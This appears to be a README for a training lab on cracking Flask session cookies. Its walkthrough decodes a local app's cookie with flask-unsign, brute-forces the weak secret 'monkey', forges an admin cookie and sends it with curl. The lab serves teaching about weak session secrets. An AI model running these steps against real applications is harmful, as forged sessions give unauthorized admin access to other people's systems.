# cracked_flask
A very simple lab for cracking Flask session cookies


## Walkthrough

Pull down the cookie and have a look what is in it:

```
flask-unsign --decode --server http://127.0.0.1:5000
```

Try to crack it:

```
flask-unsign --unsign --server http://127.0.0.1:5000
```

Cracked it and got the secret key "monkey" so now create a new cookie with the username admin rather than robin:

```
flask-unsign --sign --secret monkey --cookie "{'hello': 'world2', 'username': 'admin'}"
```

Finally, make a request using the new cookie:

```
curl --cookie "session=eyJoZWxsbyI6IndvcmxkMiIsInVzZXJuYW1lIjoiYWRtaW4ifQ.YbCXpA.45th8HQUFJO6GHycU_fMkPQ31qc" http://127.0.0.1:5000
```
